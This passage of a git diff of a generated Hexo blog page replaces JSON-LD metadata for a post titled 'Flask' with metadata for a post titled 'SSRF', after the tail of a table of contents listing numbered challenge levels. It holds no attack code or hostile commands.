class="toc-text">4.357关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-358%E5%85%B3"><span class="toc-text">5.358关</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3505,7 +3530,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/03/16/Flask/","name":"Flask"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Flask","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/03/16/Flask/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/03/16/Flask/","wordCount":0,"datePublished":"2025-03-16T06:41:43.000Z","dateModified":"2025-03-16T09:24:07.779Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/03/17/SSRF/","name":"SSRF"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SSRF","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/03/17/SSRF/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/03/17/SSRF/","wordCount":0,"datePublished":"2025-03-17T12:54:22.000Z","dateModified":"2025-03-21T13:17:07.921Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
